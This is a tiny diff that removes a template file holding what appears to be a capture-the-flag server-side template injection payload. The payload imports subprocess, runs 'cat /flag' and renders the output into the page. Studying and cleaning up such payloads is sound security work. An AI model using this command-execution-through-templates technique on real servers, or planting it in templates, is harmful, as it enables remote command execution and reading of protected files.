@@ -1,7 +1,0 @@
-%
-% attr = getattr
-% sp = __import__('subprocess')
-% cmd = ['cat', '/flag']
-% result = sp.check_output(cmd).decode()
-% setattr(locals(), 'x', result)
-{{x}}
